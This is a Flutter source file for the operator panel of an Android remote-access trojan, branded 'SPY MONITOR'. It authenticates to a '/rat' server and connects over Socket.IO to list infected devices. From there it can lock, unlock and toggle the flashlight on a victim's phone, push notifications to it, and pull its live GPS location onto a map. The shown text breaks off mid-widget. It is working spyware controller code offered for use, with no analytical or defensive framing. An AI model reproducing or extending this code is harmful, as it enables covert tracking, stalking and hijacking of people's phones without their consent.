import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:intl/intl.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart';
import 'dart:ui';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'btrapps/.dart';

// ──────────────────────────────────────────────────────────────────
// API SERVICE
// ──────────────────────────────────────────────────────────────────

class RatApi {
  final String baseUrl;
  late IO.Socket socket;
  String? _token;

  RatApi({required this.baseUrl});

  // Login
  Future<Map<String, dynamic>> login(String username, String password) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/rat/login'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'username': username, 'password': password}),
      ).timeout(const Duration(seconds: 10));

      final data = jsonDecode(response.body);
      if (data['success'] == true) {
        _token = data['token'];
        await _saveToken(_token!);
        return {'success': true, 'data': data};
      }
      return {'success': false, 'error': data['message']};
    } catch (e) {
      return {'success': false, 'error': 'Connection error: $e'};
    }
  }

  // Connect Socket.IO
Future<bool> connectSocket() async {
  if (_token == null) {
    _token = await _getToken();
  }
  if (_token == null) {
    print('[RAT] No token found');
    return false;
  }

  return await Future.delayed(Duration.zero, () {
    try {
      print('[RAT] Connecting to: $baseUrl'); // Debug
      
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .disableAutoConnect()
            .build(),
      );

      socket.on('connect', (_) {
        print('[RAT] ✓ Connected successfully'); // Debug
        socket.emit('controller:join', {'token': _token});
      });

      socket.on('disconnect', (_) {
        print('[RAT] Disconnected');
      });

      socket.on('connect_error', (error) {
        print('[RAT] ✗ Connection error: $error'); // Debug
      });

      socket.on('error', (error) {
        print('[RAT] ✗ Socket error: $error'); // Debug
      });

      socket.connect();
      return true;
    } catch (e) {
      print('[RAT] ✗ Exception: $e'); // Debug
      return false;
    }
  });
}

  // Get Devices
  Future<List<dynamic>> getDevices() async {
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/rat/devices?key=$_token'),
        headers: {'Content-Type': 'application/json'},
      ).timeout(const Duration(seconds: 10));

      final data = jsonDecode(response.body);
      if (data['success'] == true) {
        return data['devices'] ?? [];
      }
      return [];
    } catch (e) {
      return [];
    }
  }

  // Get Single Device
  Future<Map<String, dynamic>?> getDevice(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/rat/device/$deviceId?key=$_token'),
        headers: {'Content-Type': 'application/json'},
      ).timeout(const Duration(seconds: 10));

      final data = jsonDecode(response.body);
      if (data['success'] == true) {
        return data['device'];
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  // Send Command
  Future<Map<String, dynamic>> sendCommand(
    String deviceId,
    String command,
    String? value,
  ) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/rat/command/$deviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': _token,
          'deviceId': deviceId,
          'command': command,
          'value': value ?? '',
        }),
      ).timeout(const Duration(seconds: 10));

      final data = jsonDecode(response.body);
      return {
        'success': data['success'] == true,
        'message': data['message'] ?? 'Command sent'
      };
    } catch (e) {
      return {'success': false, 'message': 'Error: $e'};
    }
  }

  // Get Location
  Future<Map<String, dynamic>?> getLocation(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/rat/location?key=$_token&deviceId=$deviceId'),
        headers: {'Content-Type': 'application/json'},
      ).timeout(const Duration(seconds: 10));

      final data = jsonDecode(response.body);
      if (data['success'] == true) {
        return data['location'];
      }
      return null;
    } catch (e) {
      return null;
    }
  }

  // Listen Device Updates
  void onDevicesUpdate(Function(List<dynamic>) callback) {
    socket.on('devices:update', (data) {
      callback(data is List ? data : []);
    });
  }

  // Save/Get Token
  Future<void> _saveToken(String token) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('rat_token', token);
  }

  Future<String?> _getToken() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getString('rat_token');
  }

  Future<void> logout() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('rat_token');
    socket.disconnect();
  }
}

// ──────────────────────────────────────────────────────────────────
// UI CONSTANTS
// ──────────────────────────────────────────────────────────────────

const Color _bgDark = Color(0xFF0A0E27);
const Color _accentRed = Color(0xFFF44336);
const Color _darkRed = Color(0xFFB71C1C);
const Color _primaryWhite = Color(0xFFFFFFFF);
const Color _softGrey = Color(0xFF94A3B8);
const Color _cardDark = Color(0xFF1A2847);

const LinearGradient _redGradient = LinearGradient(
  colors: [_accentRed, _darkRed],
  begin: Alignment.topLeft,
  end: Alignment.bottomRight,
);

// ──────────────────────────────────────────────────────────────────
// MAIN PAGE
// ──────────────────────────────────────────────────────────────────

class SpywarePage extends StatefulWidget {
  final String sessionKey;
  final String userRole;
  final String username;

  const SpywarePage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.username,
  });

  @override
  State<SpywarePage> createState() => _SpywarePageState();
}

class _SpywarePageState extends State<SpywarePage>
    with TickerProviderStateMixin {
  late AnimationController _fadeController;
  late Animation<double> _fadeAnimation;
  late AnimationController _pulseController;
  late RatApi _api;

  List<dynamic> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  Map<String, dynamic>? _lastLocation;

  bool _isLoading = true;
  bool _isLoadingData = false;
  bool _isShowingDetail = false;
  String? _commandResponse;
  int _selectedTabIndex = 0;

  final TextEditingController _notifTitleController = TextEditingController();
  final TextEditingController _notifMessageController = TextEditingController();

  @override
  void initState() {
    super.initState();

    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 800),
      vsync: this,
    )..forward();

    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeOut,
    );

    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);

    _api = RatApi(baseUrl: Api.api);

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _init();
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    _notifTitleController.dispose();
    _notifMessageController.dispose();
    _api.logout();
    super.dispose();
  }

  Future<void> _init() async {
    setState(() => _isLoading = true);

    try {
      final connected = await _api.connectSocket();
      if (connected) {
        _api.onDevicesUpdate((devices) {
          if (mounted) setState(() => _devices = devices);
        });

        await _fetchDevices();
      } else {
        _showError('Failed to connect');
      }
    } catch (e) {
      _showError('Error: $e');
    } finally {
      setState(() => _isLoading = false);
    }
  }

  Future<void> _fetchDevices() async {
    try {
      final devices = await _api.getDevices();
      if (mounted) setState(() => _devices = devices);
    } catch (e) {
      _showError('Error fetching devices: $e');
    }
  }

  Future<void> _fetchLocation(String deviceId) async {
    setState(() {
      _isLoadingData = true;
    });

    try {
      final location = await _api.getLocation(deviceId);
      if (mounted) {
        setState(() {
          _lastLocation = location;
          _isLoadingData = false;
        });
      }
    } catch (e) {
      _showError('Error fetching location: $e');
      setState(() => _isLoadingData = false);
    }
  }

  Future<void> _executeCommand(
    String deviceId,
    String command,
    String? value,
  ) async {
    try {
      final result = await _api.sendCommand(deviceId, command, value);

      if (result['success'] == true) {
        setState(() {
          _commandResponse = '✓ ${result['message']}';
        });
        _showSuccess(result['message']);

        Future.delayed(const Duration(seconds: 2), () {
          if (mounted) setState(() => _commandResponse = null);
        });
      } else {
        _showError(result['message'] ?? 'Command failed');
      }
    } catch (e) {
      _showError('Error: $e');
    }
  }

  void _showError(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.error, color: Colors.white),
            const SizedBox(width: 8),
            Expanded(child: Text(msg)),
          ],
        ),
        backgroundColor: _accentRed,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  void _showSuccess(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.check_circle, color: Colors.white),
            const SizedBox(width: 8),
            Expanded(child: Text(msg)),
          ],
        ),
        backgroundColor: Colors.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  void _navigateBack() {
    if (_isShowingDetail) {
      setState(() {
        _isShowingDetail = false;
        _selectedDevice = null;
        _lastLocation = null;
        _selectedTabIndex = 0;
      });
    } else {
      Navigator.pop(context);
    }
  }

  void _showDetail(Map<String, dynamic> device) {
    setState(() {
      _selectedDevice = device;
      _isShowingDetail = true;
      _selectedTabIndex = 0;
    });
  }

  String _formatDateTime(String? dateStr) {
    if (dateStr == null) return 'Unknown';
    try {
      final date = DateTime.parse(dateStr);
      final now = DateTime.now();
      final difference = now.difference(date);

      if (difference.inDays > 0) {
        return DateFormat('dd/MM/yyyy HH:mm').format(date);
      } else if (difference.inHours > 0) {
        return '${difference.inHours}h ago';
      } else if (difference.inMinutes > 0) {
        return '${difference.inMinutes}m ago';
      } else {
        return 'Just now';
      }
    } catch (e) {
      return 'Invalid date';
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        gradient: RadialGradient(
          center: Alignment.topLeft,
          radius: 1.5,
          colors: [
            const Color(0xFFB71C1C).withOpacity(0.15),
            _bgDark,
            _bgDark,
          ],
        ),
      ),
      child: Scaffold(
        backgroundColor: Colors.transparent,
        appBar: AppBar(
          title: const Text(
            "SPY MONITOR",
            style: TextStyle(
              color: _primaryWhite,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
              fontSize: 18,
              letterSpacing: 1.5,
            ),
          ),
          backgroundColor: Colors.transparent,
          elevation: 0,
          centerTitle: true,
          leading: IconButton(
            icon: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: _accentRed.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border:
                    Border.all(color: _accentRed.withOpacity(0.3), width: 1),
              ),
              child: const Icon(Icons.arrow_back, color: _accentRed, size: 20),
            ),
            onPressed: _navigateBack,
          ),
          flexibleSpace: ClipRect(
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
              child: Container(
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.05),
                  border: Border(
                    bottom: BorderSide(
                      color: Colors.white.withOpacity(0.1),
                      width: 0.8,
                    ),
                  ),
                ),
              ),
            ),
          ),
        ),
        body: _isLoading
            ? _buildLoading()
            : _isShowingDetail
                ? _buildDetailView()
                : _buildListView(),
      ),
    );
  }

  Widget _buildLoading() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              gradient: _redGradient,
            ),
            child: const Center(
              child: CircularProgressIndicator(
                valueColor: AlwaysStoppedAnimation<Color>(_primaryWhite),
                strokeWidth: 3,
              ),
            ),
          ),
          const SizedBox(height: 16),
          const Text(
            'LOADING DEVICES...',
            style: TextStyle(
              color: _softGrey,
              fontSize: 12,
              letterSpacing: 2,
              fontWeight: FontWeight.w600,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildListView() {
    if (_devices.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              Icons.devices_other,
              size: 80,
              color: _accentRed.withOpacity(0.3),
            ),
            const SizedBox(height: 16),
            const Text(
              'No Devices Found',
              style: TextStyle(
                color: _primaryWhite,
                fontSize: 18,
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      );
    }

    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _devices.length,
      itemBuilder: (context, index) {
        final device = _devices[index];
        final isOnline = device['online'] == true;

        return GestureDetector(
          onTap: () => _showDetail(device),
          child: FadeTransition(
            opacity: _fadeAnimation,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              margin: const EdgeInsets.only(bottom: 16),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    _cardDark,
                    isOnline
                        ? _accentRed.withOpacity(0.08)
                        : _softGrey.withOpacity(0.05),
                  ],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(
                  color: isOnline ? _accentRed : _softGrey.withOpacity(0.3),
                  width: isOnline ? 2 : 1,
                ),
                boxShadow: [
                  if (isOnline)
                    BoxShadow(
                      color: _accentRed.withOpacity(0.2),
                      blurRadius: 15,
                      spreadRadius: 2,
                    ),
                ],
              ),
              child: Padding(
                padding: const EdgeInsets.all(20),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        gradient: _redGradient,
                        borderRadius: BorderRadius.circular(16),
                        boxShadow: [
                          BoxShadow(
                            color: _accentRed.withOpacity(0.3),
                            blurRadius: 10,
                            spreadRadius: 2,
                          ),
                        ],
                      ),
                      child: const Icon(
                        Icons.phone_android,
                        color: _primaryWhite,
                        size: 24,
                      ),
                    ),
                    const SizedBox(width: 16),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            device['name'] ?? 'Unknown Device',
                            style: const TextStyle(
                              color: _primaryWhite,
                              fontWeight: FontWeight.bold,
                              fontSize: 16,
                            ),
                          ),
                          const SizedBox(height: 6),
                          Row(
                            children: [
                              Container(
                                width: 8,
                                height: 8,
                                decoration: BoxDecoration(
                                  color: isOnline
                                      ? const Color(0xFF4CAF50)
                                      : _softGrey,
                                  shape: BoxShape.circle,
                                  boxShadow: [
                                    if (isOnline)
                                      BoxShadow(
                                        color: const Color(0xFF4CAF50)
                                            .withOpacity(0.5),
                                        blurRadius: 5,
                                      ),
                                  ],
                                ),
                              ),
                              const SizedBox(width: 8),
                              Text(
                                isOnline ? 'ONLINE' : 'OFFLINE',
                                style: TextStyle(
                                  color: isOnline
                                      ? const Color(0xFF4CAF50)
                                      : _softGrey,
                                  fontWeight: FontWeight.bold,
                                  fontSize: 12,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _accentRed.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: const Icon(
                        Icons.chevron_right,
                        color: _accentRed,
                        size: 20,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildDetailView() {
    if (_selectedDevice == null) return const SizedBox();

    final device = _selectedDevice!;
    final isOnline = device['online'] == true;
    final deviceId = device['id'];

    return Column(
      children: [
        Container(
          width: double.infinity,
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [_accentRed.withOpacity(0.2), Colors.transparent],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
          ),
          child: Row(
            children: [
              Stack(
                children: [
                  Container(
                    padding: const EdgeInsets.all(15),
                    decoration: BoxDecoration(
                      gradient: _redGradient,
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: _accentRed.withOpacity(0.5),
                          blurRadius: 20,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: const Icon(
                      Icons.phone_android,
                      size: 30,
                      color: _primaryWhite,
                    ),
                  ),
                  if (isOnline)
                    Positioned(
                      right: 0,
                      bottom: 0,
                      child: Container(
                        width: 12,
                        height: 12,
                        decoration: BoxDecoration(
                          color: const Color(0xFF4CAF50),
                          shape: BoxShape.circle,
                          border: Border.all(color: _bgDark, width: 2),
                        ),
                      ),
                    ),
                ],
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      device['name'] ?? 'Unknown',
                      style: const TextStyle(
                        color: _primaryWhite,
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 12, vertical: 5),
                      decoration: BoxDecoration(
                        color: _accentRed.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                            color: _accentRed.withOpacity(0.3), width: 1),
                      ),
                      child: Text(
                        'Battery: ${device['info']?['battery'] ?? 0}%',
                        style: const TextStyle(
                          color: _accentRed,
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
          padding: const EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: _cardDark,
            borderRadius: BorderRadius.circular(30),
            border: Border.all(color: _accentRed.withOpacity(0.3), width: 1),
          ),
          child: Row(
            children: [
              _buildTabButton(0, Icons.info_outline, 'INFO'),
              _buildTabButton(1, Icons.settings_outlined, 'CONTROL'),
              _buildTabButton(2, Icons.location_on, 'LOCATION'),
            ],
          ),
        ),
        Expanded(
          child: IndexedStack(
            index: _selectedTabIndex,
            children: [
              _buildInfoTab(device),
              _buildControlTab(deviceId, isOnline),
              _buildLocationTab(deviceId, isOnline),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildTabButton(int index, IconData icon, String label) {
    final isSelected = _selectedTabIndex == index;

    return Expanded(
      child: GestureDetector(
        onTap: () => setState(() => _selectedTabIndex = index),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          padding: const EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
            gradient: isSelected ? _redGradient : null,
            borderRadius: BorderRadius.circular(30),
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                icon,
                color: isSelected ? _primaryWhite : _softGrey,
                size: 18,
              ),
              if (isSelected) ...[
                const SizedBox(width: 6),
                Text(
                  label,
                  style: const TextStyle(
                    color: _primaryWhite,
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInfoTab(Map<String, dynamic> device) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _buildSection(
            'DEVICE INFORMATION',
            Icons.phone_android,
            [
              _buildRow('Device ID', device['id'] ?? 'N/A'),
              _buildRow('Name', device['name'] ?? 'Unknown'),
              _buildRow('Connected At', _formatDateTime(device['connectedAt'])),
              _buildRow('Last Seen', _formatDateTime(device['lastSeen'])),
            ],
          ),
          const SizedBox(height: 16),
          _buildSection(
            'STATUS',
            Icons.info_outlined,
            [
              _buildRow('Status', device['online'] == true ? 'ONLINE' : 'OFFLINE'),
              _buildRow('Battery', '${device['info']?['battery'] ?? 0}%'),
              _buildRow('Android', device['info']?['androidVersion'] ?? 'Unknown'),
              _buildRow('SDK', device['info']?['sdkVersion']?.toString() ?? 'Unknown'),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildSection(String title, IconData icon, List<Widget> children) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [_cardDark, _accentRed.withOpacity(0.08)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _accentRed.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: _accentRed.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: _accentRed, size: 16),
              ),
              const SizedBox(width: 8),
              Text(
                title,
                style: const TextStyle(
                  color: _accentRed,
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          ...children,
        ],
      ),
    );
  }

  Widget _buildRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Row(
        children: [
          Text(
            label,
            style: const TextStyle(
              color: _softGrey,
              fontSize: 12,
              fontWeight: FontWeight.w500,
            ),
          ),
          const Spacer(),
          Text(
            value,
            style: const TextStyle(
              color: _primaryWhite,
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
            textAlign: TextAlign.end,
          ),
        ],
      ),
    );
  }

  Widget _buildControlTab(String deviceId, bool isOnline) {
    if (!isOnline) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.wifi_off, size: 64, color: _softGrey.withOpacity(0.5)),
            const SizedBox(height: 16),
            const Text(
              'Device Offline',
              style: TextStyle(
                color: _primaryWhite,
                fontSize: 18,
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      );
    }

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _buildCommandSection(
            'SCREEN CONTROL',
            Icons.lock_outline,
            Colors.orange,
            [
              _buildCmdButton('Lock Device', Icons.lock, Colors.orange, () {
                _executeCommand(
                  deviceId,
                  'lockDevice',
                  jsonEncode({'title': 'Device Locked'}),
                );
              }),
              _buildCmdButton('Unlock', Icons.lock_open, Colors.green, () {
                _executeCommand(deviceId, 'unlockDevice', null);
              }),
            ],
          ),
          const SizedBox(height: 16),
          _buildCommandSection(
            'FLASHLIGHT',
            Icons.flash_on,
            Colors.yellow[700]!,
            [
              _buildCmdButton('ON', Icons.flash_on, Colors.yellow[700]!, () {
                _executeCommand(deviceId, 'flashlightOn', null);
              }),
              _buildCmdButton('OFF', Icons.flash_off, Colors.grey, () {
                _executeCommand(deviceId, 'flashlightOff', null);
              }),
            ],
          ),
          const SizedBox(height: 16),
          _buildCommandSection(
            'NOTIFICATION',
            Icons.notifications,
            Colors.orange,
            [
              _buildCmdButton('Send', Icons.notifications, Colors.orange, () {
                _showNotificationDialog(deviceId);
              }),
            ],
          ),
          if (_commandResponse != null) ...[
            const SizedBox(height: 16),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [Colors.green.withOpacity(0.2), Colors.transparent],
                ),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.green, width: 1),
              ),
              child: Row(
                children: [
                  const Icon(Icons.check_circle, color: Colors.green, size: 20),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      _commandResponse!,
                      style: const TextStyle(
                        color: _primaryWhite,
                        fontSize: 12,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildCommandSection(
    String title,
    IconData icon,
    Color color,
    List<Widget> buttons,
  ) {
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [_cardDark, color.withOpacity(0.08)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.all(16),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: color.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: Icon(icon, color: color, size: 16),
                ),
                const SizedBox(width: 8),
                Text(
                  title,
                  style: TextStyle(
                    color: color,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
          ...buttons,
        ],
      ),
    );
  }

  Widget _buildCmdButton(
    String label,
    IconData icon,
    Color color,
    VoidCallback onTap,
  ) {
    return InkWell(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          border: Border(
            top: BorderSide(color: color.withOpacity(0.2), width: 0.5),
          ),
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: color.withOpacity(0.2),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(icon, color: color, size: 18),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                label,
                style: const TextStyle(
                  color: _primaryWhite,
                  fontSize: 14,
                  fontWeight: FontWeight.w500,
                ),
              ),
            ),
            Icon(Icons.arrow_forward_ios, color: color, size: 14),
          ],
        ),
      ),
    );
  }

  void _showNotificationDialog(String deviceId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _accentRed.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Icon(Icons.notifications,
                  color: Colors.orange, size: 24),
            ),
            const SizedBox(width: 12),
            const Text(
              'Send Notification',
              style: TextStyle(
                color: _primaryWhite,
                fontWeight: FontWeight.bold,
                fontSize: 16,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _notifTitleController,
              style: const TextStyle(color: _primaryWhite),
              decoration: InputDecoration(
                labelText: 'Title',
                labelStyle: TextStyle(color: _softGrey),
                enabledBorder: OutlineInputBorder(
                  borderSide:
                      BorderSide(color: _accentRed.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: const BorderSide(color: _accentRed, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: _accentRed.withOpacity(0.05),
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: _notifMessageController,
              style: const TextStyle(color: _primaryWhite),
              maxLines: 3,
              decoration: InputDecoration(
                labelText: 'Message',
                labelStyle: TextStyle(color: _softGrey),
                enabledBorder: OutlineInputBorder(
                  borderSide:
                      BorderSide(color: _accentRed.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: const BorderSide(color: _accentRed, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: _accentRed.withOpacity(0.05),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              _notifTitleController.clear();
              _notifMessageController.clear();
              Navigator.pop(context);
            },
            style: TextButton.styleFrom(foregroundColor: _softGrey),
            child: const Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.orange,
              foregroundColor: _primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              if (_notifTitleController.text.isNotEmpty &&
                  _notifMessageController.text.isNotEmpty) {
                _executeCommand(
                  deviceId,
                  'showNotification',
                  jsonEncode({
                    'title': _notifTitleController.text,
                    'message': _notifMessageController.text,
                  }),
                );
                _notifTitleController.clear();
                _notifMessageController.clear();
              }
            },
            child: const Text('Send'),
          ),
        ],
      ),
    );
  }

  Widget _buildLocationTab(String deviceId, bool isOnline) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_cardDark, Colors.blue.withOpacity(0.08)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.blue.withOpacity(0.3), width: 1),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: Colors.blue.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: const Icon(Icons.location_on, color: Colors.blue),
                    ),
                    const SizedBox(width: 12),
                    const Text(
                      'LIVE LOCATION',
                      style: TextStyle(
                        color: Colors.blue,
                        fontWeight: FontWeight.bold,
                        fontSize: 14,
                        letterSpacing: 1,
                      ),
                    ),
                    const Spacer(),
                    if (isOnline)
                      AnimatedBuilder(
                        animation: _pulseController,
                        builder: (context, child) => Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 8, vertical: 4),
                          decoration: BoxDecoration(
                            color: Colors.green.withOpacity(0.2),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(color: Colors.green, width: 1),
                          ),
                          child: Row(
                            children: [
                              Container(
                                width: 6,
                                height: 6,
                                decoration: const BoxDecoration(
                                  color: Colors.green,
                                  shape: BoxShape.circle,
                                ),
                              ),
                              const SizedBox(width: 4),
                              const Text(
                                'LIVE',
                                style: TextStyle(
                                  color: Colors.green,
                                  fontSize: 10,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                  ],
                ),
                const SizedBox(height: 16),
                if (_lastLocation != null) ...[
                  Container(
                    height: 280,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                          color: Colors.blue.withOpacity(0.3), width: 1),
                    ),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(12),
                      child: FlutterMap(
                        options: MapOptions(
                          initialCenter: LatLng(
                              _lastLocation!['latitude'] ?? 0,
                              _lastLocation!['longitude'] ?? 0),
                          initialZoom: 15,
                        ),
                        children: [
                          TileLayer(
